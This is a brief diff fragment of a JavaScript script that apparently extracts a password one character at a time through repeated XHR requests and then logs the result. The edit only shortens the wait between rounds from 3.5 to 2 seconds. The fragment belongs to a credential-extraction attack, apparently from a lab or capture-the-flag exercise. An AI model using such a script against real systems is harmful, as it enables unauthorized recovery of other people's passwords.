@@ -24,6 +24,6 @@ while (passwd.length < pass_len) {
 		xhr.send();
 		})(i);
 	};
-	await new Promise(resolve => setTimeout(resolve, 3500)); // 3.5 sec
+	await new Promise(resolve => setTimeout(resolve, 2000)); // 2 sec. Increase delay if it doesn't work for you.
 };
 console.log(`Password is ${passwd}`);
